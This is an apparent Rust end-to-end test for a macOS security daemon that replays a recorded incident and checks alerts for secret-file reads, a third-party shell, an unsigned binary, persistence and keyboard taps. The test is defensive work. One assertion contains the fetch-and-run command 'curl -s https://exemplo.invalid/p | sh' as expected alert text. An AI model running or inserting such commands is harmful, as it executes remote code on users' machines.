//! Teste ponta a ponta: sobe o binário do daemon em modo replay com a
//! reconstituição do incidente de 16/10, conecta pelo socket como o app faria
//! e confere alertas, ações, linha do tempo e relatórios do app.

use std::io::{BufRead, BufReader, Write};
use std::os::unix::net::UnixStream;
use std::path::Path;
use std::process::{Child, Command};
use std::time::{Duration, Instant};

use vigia_proto::{
    ActionKind, Alert, AlertStatus, ClientMsg, ProcInfo, Report, ServerMsg, Severity,
};

struct Daemon(Child);
impl Drop for Daemon {
    fn drop(&mut self) {
        let _ = self.0.kill();
    }
}

struct Conn {
    w: UnixStream,
    r: BufReader<UnixStream>,
}

impl Conn {
    fn open(sock: &Path) -> Self {
        let deadline = Instant::now() + Duration::from_secs(20);
        loop {
            if let Ok(s) = UnixStream::connect(sock) {
                s.set_read_timeout(Some(Duration::from_secs(10))).unwrap();
                return Conn {
                    r: BufReader::new(s.try_clone().unwrap()),
                    w: s,
                };
            }
            assert!(Instant::now() < deadline, "daemon não abriu o socket");
            std::thread::sleep(Duration::from_millis(100));
        }
    }

    fn send(&mut self, m: &ClientMsg) {
        self.w.write_all(vigia_proto::encode(m).as_bytes()).unwrap();
    }

    /// Lê até achar uma mensagem que `pick` aceite (pula alertas empurrados).
    fn wait<T>(&mut self, mut pick: impl FnMut(ServerMsg) -> Option<T>) -> T {
        let mut line = String::new();
        loop {
            line.clear();
            let n = self
                .r
                .read_line(&mut line)
                .expect("timeout esperando o daemon");
            assert!(n > 0, "daemon fechou a conexão");
            let msg: ServerMsg = serde_json::from_str(line.trim()).unwrap();
            if let Some(x) = pick(msg) {
                return x;
            }
        }
    }

    fn history(&mut self) -> Vec<Alert> {
        self.send(&ClientMsg::History { limit: 100 });
        self.wait(|m| match m {
            ServerMsg::History { alerts } => Some(alerts),
            _ => None,
        })
    }

    fn act(&mut self, id: i64, action: ActionKind) -> (bool, String) {
        self.send(&ClientMsg::Act {
            alert_id: id,
            action,
        });
        self.wait(|m| match m {
            ServerMsg::ActionResult { ok, message, .. } => Some((ok, message)),
            _ => None,
        })
    }
}

#[test]
fn replays_the_incident_end_to_end() {
    let dir = tempfile::tempdir().unwrap();
    let sock = dir.path().join("vigia.sock");
    let cfg = dir.path().join("config.yaml");
    std::fs::write(
        &cfg,
        format!(
            r#"
user: {{ home: /Users/dev, uid: {uid} }}
paths:
  db: {db}
  allow_file: {allow}
  quarantine_dir: {q}
  settings_file: {settings}
third_party_dirs: ["~/repos-terceiros"]
learning_hours: 0
"#,
            uid = unsafe { libc_geteuid() },
            db = dir.path().join("vigia.db").display(),
            allow = dir.path().join("allow.yaml").display(),
            q = dir.path().join("q").display(),
            settings = dir.path().join("ajustes.yaml").display(),
        ),
    )
    .unwrap();
    // Uma exceção pré-existente, para a leitura pelo socket (não afeta o replay).
    std::fs::write(
        dir.path().join("allow.yaml"),
        "allow:\n  - { rule: new_connection, signing_id: com.exemplo.app, team_id: ABCDE12345, comment: teste }\n",
    )
    .unwrap();
    let fixture = concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/tests/fixtures/incidente.jsonl"
    );
    let _d = Daemon(
        Command::new(env!("CARGO_BIN_EXE_vigia-daemon"))
            .args(["run", "--config"])
            .arg(&cfg)
            .args(["--replay", fixture, "--no-pollers", "--socket"])
            .arg(&sock)
            .env("RUST_LOG", "warn")
            .spawn()
            .unwrap(),
    );

    let mut c = Conn::open(&sock);
    c.send(&ClientMsg::Hello {
        version: vigia_proto::PROTOCOL_VERSION,
    });
    c.wait(|m| matches!(m, ServerMsg::Welcome { .. }).then_some(()));

    // O replay é assíncrono: espera os 8 alertas chegarem.
    let deadline = Instant::now() + Duration::from_secs(20);
    let alerts = loop {
        let h = c.history();
        if h.len() >= 8 || Instant::now() > deadline {
            break h;
        }
        std::thread::sleep(Duration::from_millis(200));
    };
    let count = |rule: &str| alerts.iter().filter(|a| a.rule == rule).count();
    assert_eq!(
        count("secret_read"),
        5,
        "4 .env + credenciais AWS: {alerts:#?}"
    );
    assert_eq!(count("third_party_shell"), 1);
    assert_eq!(count("unsigned_exec"), 1);
    assert_eq!(count("persistence"), 1);
    assert_eq!(alerts.len(), 8);

    let prd = alerts
        .iter()
        .find(|a| a.target.as_deref() == Some("/Users/dev/projetos/loja-backoffice/.env.prd"))
        .unwrap();
    assert_eq!(prd.severity, Severity::Critical);
    assert!(
        alerts.iter().all(|a| a.simulated),
        "replay sempre vira simulação"
    );
    assert!(
        prd.chain.is_empty(),
        "pids da gravação não são procurados no sistema"
    );
    assert_eq!(prd.process.pid, 80003);
    assert_eq!(
        prd.process.cwd.as_deref(),
        Some("/Users/dev/repos-terceiros/ws-chat-demo"),
        "cwd aprendido do exec"
    );

    let shell = alerts
        .iter()
        .find(|a| a.rule == "third_party_shell")
        .unwrap();
    assert!(shell
        .detail
        .contains("curl -s https://exemplo.invalid/p | sh"));
    assert_eq!(shell.process.pid, 80003, "a ação mira o node");

    let persist = alerts.iter().find(|a| a.rule == "persistence").unwrap();
    assert!(persist.actions.contains(&ActionKind::Quarantine));

    // Ignorar fecha o alerta e o update chega como Alert.
    let (ok, _) = c.act(prd.id, ActionKind::Dismiss);
    assert!(ok);
    let updated = c.history().into_iter().find(|a| a.id == prd.id).unwrap();
    assert_eq!(updated.status, AlertStatus::Dismissed);

    // Ação em alerta fechado é recusada.
    let (ok, msg) = c.act(prd.id, ActionKind::Allow);
    assert!(!ok);
    assert!(msg.contains("resolvido"), "{msg}");

    // Na simulação, Permitir não grava exceção nenhuma.
    let (ok, msg) = c.act(shell.id, ActionKind::Allow);
    assert!(ok, "{msg}");
    assert!(msg.contains("simulação"), "{msg}");
    let allow = std::fs::read_to_string(dir.path().join("allow.yaml")).unwrap_or_default();
    assert!(
        !allow.contains("third_party_shell"),
        "simulação não pode criar exceção real"
    );

    // Encerrar não envia sinal a ninguém: o pid é da gravação e pode existir no Mac.
    let unsigned = alerts.iter().find(|a| a.rule == "unsigned_exec").unwrap();
    let (ok, msg) = c.act(unsigned.id, ActionKind::KillTree);
    assert!(ok, "{msg}");
    let after = c
        .history()
        .into_iter()
        .find(|a| a.id == unsigned.id)
        .unwrap();
    assert_eq!(after.status, AlertStatus::Killed);
    assert!(after.status_message.unwrap().contains("nada foi executado"));

    // Linha do tempo de processos.
    c.send(&ClientMsg::Timeline { limit: 50 });
    let entries = c.wait(|m| match m {
        ServerMsg::Timeline { entries } => Some(entries),
        _ => None,
    });
    assert_eq!(entries.len(), 6);
    assert_eq!(
        entries[0].path, "/private/tmp/.tw-cache/twhelper",
        "mais recente primeiro"
    );

    // O app reporta um leitor de teclado; volta como alerta normal.
    c.send(&ClientMsg::Report {
        report: Report {
            rule: "keyboard_tap".into(),
            severity: Severity::Critical,
            title: "twhelper está lendo o teclado".into(),
            detail: "teste".into(),
            target: Some("teclado".into()),
            process: ProcInfo {
                pid: 0,
                path: "/private/tmp/.tw-cache/twhelper".into(),
                ..Default::default()
            },
        },
    });
    // A resposta e o alerta empurrado podem chegar em qualquer ordem.
    let (mut tap, mut reported) = (None, None);
    while tap.is_none() || reported.is_none() {
        c.wait(|m| match m {
            ServerMsg::Alert { alert } if alert.rule == "keyboard_tap" => {
                tap = Some(alert);
                Some(())
            }
            ServerMsg::Reported { ok, .. } => {
                reported = Some(ok);
                Some(())
            }
            _ => None,
        });
    }
    let tap = tap.unwrap();
    assert!(
        !tap.simulated,
        "o leitor de teclado reportado pelo app é real"
    );
    assert_eq!(reported, Some(true));
    assert!(tap.actions.contains(&ActionKind::OpenSettings));
    assert!(
        !tap.actions.contains(&ActionKind::Kill),
        "sem pid não dá para matar"
    );

    // Regras que o app não pode reportar são recusadas.
    c.send(&ClientMsg::Report {
        report: Report {
            rule: "secret_read".into(),
            severity: Severity::Low,
            title: "x".into(),
            detail: "x".into(),
            target: None,
            process: ProcInfo::default(),
        },
    });
    let ok = c.wait(|m| match m {
        ServerMsg::Reported { ok, .. } => Some(ok),
        _ => None,
    });
    assert!(!ok);

    c.send(&ClientMsg::Status);
    let st = c.wait(|m| match m {
        ServerMsg::Status { status } => Some(status),
        _ => None,
    });
    assert_eq!(st.events_total, 12);

    // Exceções: o daemon devolve as do allow.yaml.
    c.send(&ClientMsg::Allowlist);
    let entries = c.wait(|m| match m {
        ServerMsg::Allowlist { entries } => Some(entries),
        _ => None,
    });
    assert_eq!(entries.len(), 1, "{entries:?}");
    assert_eq!(entries[0].rule, "new_connection");
    assert_eq!(entries[0].signing_id.as_deref(), Some("com.exemplo.app"));
    assert_eq!(entries[0].team_id.as_deref(), Some("ABCDE12345"));
    assert_eq!(entries[0].comment.as_deref(), Some("teste"));

    // Ajustes: lê, muda e o daemon grava o ajustes.yaml.
    c.send(&ClientMsg::GetSettings);
    let mut s = c.wait(|m| match m {
        ServerMsg::Settings { settings } => Some(settings),
        _ => None,
    });
    assert_eq!(s.third_party_dirs, vec!["~/repos-terceiros"]);
    s.third_party_dirs = vec![dir.path().display().to_string()];
    s.rules.insert("new_connection".into(), false);
    c.send(&ClientMsg::SaveSettings {
        settings: s.clone(),
    });
    let (ok, message, saved) = c.wait(|m| match m {
        ServerMsg::SettingsSaved {
            ok,
            message,
            settings,
        } => Some((ok, message, settings)),
        _ => None,
    });
    assert!(ok, "{message}");
    assert_eq!(saved.rules.get("new_connection"), Some(&false));
    let file = std::fs::read_to_string(dir.path().join("ajustes.yaml")).unwrap();
    assert!(file.contains("new_connection: false"), "{file}");

    // Pasta que não existe é recusada e nada muda.
    s.watch_dirs = vec!["/nao/existe".into()];
    c.send(&ClientMsg::SaveSettings { settings: s });
    let (ok, message, now) = c.wait(|m| match m {
        ServerMsg::SettingsSaved {
            ok,
            message,
            settings,
        } => Some((ok, message, settings)),
        _ => None,
    });
    assert!(!ok);
    assert!(message.contains("não existe"), "{message}");
    assert!(now.watch_dirs.is_empty());
}

extern "C" {
    #[link_name = "geteuid"]
    fn libc_geteuid() -> u32;
}
